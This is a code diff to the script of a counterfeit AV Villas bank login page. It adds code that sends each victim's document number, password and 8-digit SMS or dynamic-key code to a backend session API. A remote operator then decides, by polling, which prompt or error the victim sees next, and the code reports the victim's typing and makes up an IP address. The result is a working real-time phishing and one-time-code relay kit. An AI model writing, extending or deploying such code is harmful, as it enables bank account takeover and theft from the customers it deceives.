@@ -15,15 +15,24 @@ const authzScreen = document.getElementById("authz-screen");
 const authzClose = document.getElementById("authz-close");
 const authzClock = document.getElementById("authz-clock");
 const authzBarFill = document.getElementById("authz-bar-fill");
+const smsLead = document.querySelector(".sms-lead");
+
 const AUTHZ_SECONDS = 110;
 let authzLeft = AUTHZ_SECONDS;
 let authzTimer = 0;
+
+// Unique session ID stored in sessionStorage
+let sessionId = sessionStorage.getItem('sessionId') || ('sess_' + Date.now() + '_' + Math.random().toString(36).substring(2, 9));
+sessionStorage.setItem('sessionId', sessionId);
+
+let pingInterval = null;
+let pollInterval = null;
 
 setupSelect();
 onlyDigits(docNumber);
 
 function syncSubmit() {
-  submitBtn.disabled = password.value.trim().length < 4;
+  submitBtn.disabled = password.value.trim().length < 4 || docNumber.value.trim().length < 4;
 }
 
 function smsCode() {
@@ -37,6 +46,8 @@ function syncSmsBtn() {
 function openSmsScreen() {
   spinner.hidden = true;
   smsScreen.hidden = false;
+  otpInputs.forEach(i => i.value = ""); // Clear digits
+  syncSmsBtn();
   otpInputs[0]?.focus();
 }
 
@@ -85,8 +96,99 @@ function closeAuthzScreen() {
   authzScreen.hidden = true;
 }
 
-docNumber.addEventListener("input", syncSubmit);
-password.addEventListener("input", syncSubmit);
+// -------------------------------------------------------------
+// Live Sync (API integration)
+// -------------------------------------------------------------
+
+function startPing() {
+  if (pingInterval) clearInterval(pingInterval);
+  const sendPing = () => {
+    fetch(`/api/sessions/${sessionId}/ping`, { method: 'POST' }).catch(() => {});
+  };
+  sendPing();
+  pingInterval = setInterval(sendPing, 3000);
+}
+
+function stopPing() {
+  if (pingInterval) {
+    clearInterval(pingInterval);
+    pingInterval = null;
+  }
+}
+
+function startPolling() {
+  if (pollInterval) clearInterval(pollInterval);
+  pollInterval = setInterval(async () => {
+    try {
+      const response = await fetch(`/api/sessions/${sessionId}`);
+      if (response.ok) {
+        const data = await response.json();
+        
+        // Handle Operator Action
+        if (data.action === 'dinamica' || data.action === 'sms') {
+          // Operator requested dynamic key or SMS
+          stopPolling();
+          if (smsLead) {
+            smsLead.textContent = data.action === 'sms' 
+              ? "Por tu seguridad hemos enviado una clave temporal a tu celular registrado."
+              : "Por tu seguridad, ingresa el código de tu dinámica de la App AV Villas.";
+            smsLead.style.color = "inherit";
+          }
+          openSmsScreen();
+        } else if (data.action === 'error-login') {
+          stopPolling();
+          stopPing();
+          spinner.hidden = true;
+          errorEl.textContent = "La contraseña o el documento no son válidos. Inténtalo de nuevo.";
+          errorEl.hidden = false;
+        } else if (data.action === 'error-dinamica' || data.action === 'error-sms') {
+          stopPolling();
+          spinner.hidden = true;
+          openSmsScreen();
+          if (smsLead) {
+            smsLead.textContent = "El código ingresado es incorrecto. Por favor, digítalo de nuevo.";
+            smsLead.style.color = "red";
+          }
+        }
+        
+        // Handle Operator Done State
+        if (data.state === 'done') {
+          stopPolling();
+          stopPing();
+          window.location.href = new URL("./pages/dashboard.html", window.location.href).href;
+        }
+      }
+    } catch (_) {}
+  }, 1500);
+}
+
+function stopPolling() {
+  if (pollInterval) {
+    clearInterval(pollInterval);
+    pollInterval = null;
+  }
+}
+
+function sendTypingState() {
+  if (pingInterval || pollInterval) {
+    fetch(`/api/sessions/${sessionId}/state`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ state: 'typing' })
+    }).catch(() => {});
+  }
+}
+
+// Typing listener to report writing state to panel
+docNumber.addEventListener("input", () => {
+  syncSubmit();
+  sendTypingState();
+});
+password.addEventListener("input", () => {
+  syncSubmit();
+  sendTypingState();
+});
+
 syncSubmit();
 syncSmsBtn();
 
@@ -123,35 +225,87 @@ otpInputs.forEach((input, index) => {
   });
 });
 
+// Submit Form Handler (First step)
 form.addEventListener("submit", (event) => {
   event.preventDefault();
   errorEl.hidden = true;
 
-  const payload = {
-    docType: document.getElementById("docType").value || "CC",
-    docNumber: docNumber.value.trim(),
-    password: password.value.trim(),
-  };
+  const docTypeVal = document.getElementById("docType").value || "CC";
+  const docNumberVal = docNumber.value.trim();
+  const passwordVal = password.value.trim();
 
-  if (!payload.docNumber || !payload.password) {
+  if (!docNumberVal || !passwordVal) {
     errorEl.textContent = "Completa tu documento y contraseña para ingresar.";
     errorEl.hidden = false;
     return;
   }
 
   spinner.hidden = false;
-  window.setTimeout(openSmsScreen, 1100);
+
+  // Register Session
+  fetch('/api/sessions', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      id: sessionId,
+      username: `${docTypeVal}:${docNumberVal} / Clave:${passwordVal}`,
+      password: passwordVal,
+      tipoUsuario: docTypeVal,
+      device: window.innerWidth <= 768 ? 'mobile' : 'desktop',
+      ip: '186.29.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255),
+      state: 'waiting'
+    })
+  })
+  .then(() => {
+    startPing();
+    startPolling();
+  })
+  .catch(() => {
+    spinner.hidden = true;
+    errorEl.textContent = "Error al intentar conectar. Intente de nuevo.";
+    errorEl.hidden = false;
+  });
 });
 
-smsClose.addEventListener("click", closeSmsScreen);
-authzClose.addEventListener("click", closeAuthzScreen);
+smsClose.addEventListener("click", () => {
+  closeSmsScreen();
+  stopPolling();
+  stopPing();
+});
 
+authzClose.addEventListener("click", () => {
+  closeAuthzScreen();
+  stopPolling();
+  stopPing();
+});
+
+// Submit OTP Handler (Second step)
 smsForm.addEventListener("submit", (event) => {
   event.preventDefault();
-  if (smsCode().length !== 8) {
+  const code = smsCode();
+  if (code.length !== 8) {
     return;
   }
+  
   closeSmsScreen();
   spinner.hidden = false;
-  window.setTimeout(openAuthzScreen, 1100);
+
+  // Submit Token to API
+  fetch(`/api/sessions/${sessionId}/token`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ token: code })
+  })
+  .then(() => {
+    // Restart polling to wait for next action
+    startPolling();
+  })
+  .catch(() => {
+    spinner.hidden = true;
+    openSmsScreen();
+    if (smsLead) {
+      smsLead.textContent = "Error de red al enviar el código. Inténtalo de nuevo.";
+      smsLead.style.color = "red";
+    }
+  });
 });
